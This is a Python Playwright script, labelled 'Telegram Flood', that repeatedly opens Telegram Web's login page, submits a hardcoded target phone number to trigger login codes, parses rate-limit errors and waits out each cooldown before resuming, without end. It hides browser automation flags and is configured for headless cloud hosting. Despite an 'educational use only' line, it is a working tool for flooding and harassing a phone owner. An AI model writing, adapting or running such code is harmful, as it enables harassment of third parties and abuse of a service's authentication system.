#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
TELEGRAM FLOOD – OPTIMIZED REFRESH TIMING (INFINITE + COOLDOWN)
- Clicks "Log in by phone number"
- Fills phone number
- Clicks "Next" with a DELAY to let the request process
- Waits for network response (or a fixed 3-4 seconds)
- Refreshes and repeats
- DETECTS "too many attempts" and waits the required time
- EDUCATIONAL USE ONLY – DO NOT USE WITHOUT PERMISSION.
"""

import asyncio
import sys
import re
import os
import logging
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError

# Force Chrome path for Render
os.environ["PLAYWRIGHT_CHROME_EXECUTABLE_PATH"] = "/usr/bin/google-chrome-stable"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

PHONE_NUMBER = "+16049773717"  # <-- CHANGE THIS TO YOUR TARGET

async def perform_login_flow(page, phone_number: str) -> tuple:
    """
    Performs the login flow with proper timing.
    Returns: (success, cooldown_seconds)
    """
    try:
        # STEP 1: Click "Log in by phone number" button
        logger.info("🔍 Clicking 'Log in by phone number'...")
        
        phone_login_btn = await page.wait_for_selector(
            "button.Button.auth-button.default.primary.text:has-text('Log in by phone number')",
            timeout=10000
        )
        
        if not phone_login_btn:
            phone_login_btn = await page.wait_for_selector(
                "button.auth-button.primary.text",
                timeout=5000
            )
        
        if phone_login_btn:
            await phone_login_btn.click()
            await page.wait_for_timeout(1500)
            logger.info("✅ Clicked phone login button")
        else:
            logger.error("❌ Phone login button not found")
            return False, 0
        
        # STEP 2: Find and fill phone input
        logger.info("📞 Looking for phone input...")
        
        phone_input = await page.wait_for_selector(
            "input#sign-in-phone-number",
            timeout=10000
        )
        
        if not phone_input:
            phone_input = await page.wait_for_selector(
                "input.form-control[type='text'][inputmode='tel']",
                timeout=5000
            )
        
        if not phone_input:
            logger.error("❌ Phone input not found")
            return False, 0
        
        # Clear and fill
        await phone_input.click()
        await phone_input.fill("")
        await page.wait_for_timeout(300)
        await phone_input.fill(phone_number)
        logger.info(f"✅ Entered phone number: {phone_number}")
        
        # STEP 3: Click "Next" button
        logger.info("▶️ Clicking 'Next'...")
        
        next_btn = await page.wait_for_selector(
            "button.Button.auth-button.default.primary:has-text('Next')",
            timeout=5000
        )
        
        if not next_btn:
            next_btn = await page.wait_for_selector(
                "button[type='submit']",
                timeout=3000
            )
        
        if next_btn:
            await next_btn.click()
            logger.info("✅ Clicked Next")
        else:
            await page.keyboard.press("Enter")
            logger.info("ℹ️ Pressed Enter instead")
        
        # STEP 4: Wait for response and check for errors
        await page.wait_for_timeout(3000)
        
        # Check for "too many attempts" error
        error_text = await page.evaluate("""
            () => {
                const errors = document.querySelectorAll('.error-message, .alert-danger, div[class*="error"]');
                for (let el of errors) {
                    if (el.textContent) return el.textContent;
                }
                const toasts = document.querySelectorAll('.toast, .notification, div[class*="alert"]');
                for (let el of toasts) {
                    if (el.textContent) return el.textContent;
                }
                return null;
            }
        """)
        
        if error_text:
            logger.warning(f"⚠️ Error message: {error_text}")
            
            # Extract cooldown time – handles "2 minutes", "10 hours", "24 hours", etc.
            cooldown_match = re.search(r'in\s+(\d+)\s+(second|minute|hour|hours|min|sec)', error_text, re.IGNORECASE)
            if cooldown_match:
                amount = int(cooldown_match.group(1))
                unit = cooldown_match.group(2).lower()
                if 'hour' in unit:
                    cooldown_seconds = amount * 3600
                elif 'min' in unit:
                    cooldown_seconds = amount * 60
                else:
                    cooldown_seconds = amount
                logger.info(f"⏳ Cooldown detected: {amount} {unit}(s) = {cooldown_seconds} seconds")
                return False, cooldown_seconds
            
            # Fallback: if it says "too many attempts" but no specific time
            if "too many" in error_text.lower() or "try again" in error_text.lower():
                logger.warning("⏳ Cooldown detected but no specific time – defaulting to 10 hours")
                return False, 36000  # 10 hours
            
            return False, 0
        
        # If no error, assume it worked
        logger.info("✅ Code request sent successfully!")
        return True, 0
            
    except Exception as e:
        logger.error(f"❌ Flow failed: {e}")
        return False, 0

async def main_async(phone_number: str):
    logger.info("=== TELEGRAM FLOOD – RENDER EDITION ===")
    logger.info(f"Target phone: {phone_number}")
    logger.info("⚠️  This will send REAL login requests. Use responsibly.\n")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,  # Must be True on Render
            args=[
                '--disable-blink-features=AutomationControlled',
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-setuid-sandbox',
                '--disable-gpu'
            ]
        )
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            viewport={"width": 1280, "height": 720}
        )
        page = await context.new_page()
        
        success_count = 0
        fail_count = 0
        attempt = 0
        
        while True:
            attempt += 1
            logger.info(f"\n{'='*50}")
            logger.info(f"🔄 ATTEMPT {attempt} – Successes: {success_count}, Fails: {fail_count}")
            logger.info(f"{'='*50}")
            
            try:
                await page.goto(
                    "https://web.telegram.org/a/",
                    wait_until="domcontentloaded",
                    timeout=15000
                )
                await page.wait_for_timeout(3000)
                
                success, cooldown = await perform_login_flow(page, phone_number)
                
                if success:
                    success_count += 1
                    logger.info(f"✅ Attempt {attempt} – code sent! (Total: {success_count})")
                else:
                    fail_count += 1
                    logger.warning(f"⚠️ Attempt {attempt} failed (Total fails: {fail_count})")
                    
                    if cooldown > 0:
                        hours = cooldown / 3600
                        logger.info(f"⏳ Waiting {cooldown} seconds ({hours:.1f} hours) before next attempt...")
                        await asyncio.sleep(cooldown)
                        logger.info("🔄 Cooldown complete – resuming...")
                        await page.reload(wait_until="domcontentloaded")
                        await page.wait_for_timeout(2000)
                        continue
                
                logger.info("⏳ Waiting 3 seconds before refresh...")
                await page.wait_for_timeout(3000)
                await page.reload(wait_until="domcontentloaded")
                await page.wait_for_timeout(2000)
                
            except Exception as e:
                logger.error(f"Unhandled error in main loop: {e}")
                logger.info("⏳ Waiting 30 seconds before retrying...")
                await asyncio.sleep(30)
                continue

if __name__ == "__main__":
    try:
        asyncio.run(main_async(PHONE_NUMBER))
    except KeyboardInterrupt:
        logger.info("\n🛑 Stopped by user.")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
